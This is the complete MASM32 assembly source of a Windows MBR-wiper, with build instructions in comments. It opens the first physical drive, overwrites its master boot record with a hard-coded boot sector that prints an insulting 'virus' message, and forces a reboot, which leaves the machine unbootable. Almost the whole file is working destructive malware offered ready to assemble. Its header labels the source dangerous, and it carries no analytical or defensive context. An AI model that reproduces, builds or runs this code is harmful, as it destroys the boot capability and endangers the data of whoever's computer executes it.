; =========================================================================
; -------------------------------------------------------------------------
;     FILENAME : KillMBR.asm
; -------------------------------------------------------------------------
;       AUTHOR : Xylitol
;        EMAIL : xylitol☆temari.fr
; DATE CREATED : 18/07/2014
;         TEST : Windows XP SP3
;         SIZE : 3Kb - 21e3c553ef9ba6a2535a6fa159d81252
;  DESCRIPTION : Overwrite the bootloader and reboot
; -------------------------------------------------------------------------
;                 This source is considered dangerous
; -------------------------------------------------------------------------
; =========================================================================
 
; ---- make.bat -----------------------------------------------------------
;@echo off
;set path=\masm32\bin
;set lib=\masm32\lib
;set name=KillMBR
;ml.exe /c /coff "%name%".asm
;link.exe /SUBSYSTEM:WINDOWS /opt:nowin98 /LIBPATH:"%lib%" "%name%".obj
;del *.OBJ
;pause
;@echo on
;cls

; ---- skeleton -----------------------------------------------------------
.386
.model flat, stdcall
option casemap :none   ; case sensitive

; ---- Include ------------------------------------------------------------
include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\ntdll.inc
include \masm32\include\shell32.inc
include \masm32\macros\macros.asm

includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\ntdll.lib

; ---- Initialized data ---------------------------------------------------
.data
volume  db '\\.\PhysicalDrive0',0 

; New bootloader will print "I am virus! Fuck you :-)"
KillMBR		db	0B8h,12h,00h,0CDh,10h,0BDh,18h,7Ch,0B9h,18h,00h,0B8h,01h,13h,0BBh,0Ch
		db	00h,0BAh,1Dh,0Eh,0CDh,10h,0E2h,0FEh,49h,20h,61h,6Dh,20h,76h,69h,72h
		db	75h,73h,21h,20h,46h,75h,63h,6Bh,20h,79h,6Fh,75h,20h,3Ah,2Dh,29h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,55h,0AAh

; ---- Uninitialized data -------------------------------------------------
.data?
buffer		dd 512 dup (?)
bytesWritten	dd 512 dup (?)
hFile		dd ?

; ---- Code ---------------------------------------------------------------
.code
start:
	invoke CreateFile,offset volume,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0
	    .if eax==0 ;If fail jump on ExitProcess
	    .else
        	mov hFile,eax
        		cld ;Trick to move the bootloader into the buffer with rep movsb
        		lea esi, KillMBR
        		lea edi, buffer
        		mov ecx, 512
        		rep movsb
        	push eax
        	mov eax,esp
	invoke WriteFile,hFile,addr buffer,512,addr bytesWritten,NULL ;write the new bootloader
	    .if eax==0 ;If fail jump on ExitProcess
		.else
			invoke CloseHandle,hFile
			invoke RtlAdjustPrivilege,13h,1h,0h,esp ;Needed for reboot
			invoke ExitWindowsEx,2,10 ;Reboot the computer
		.endif
		.endif
finish:
	invoke ExitProcess,0
end start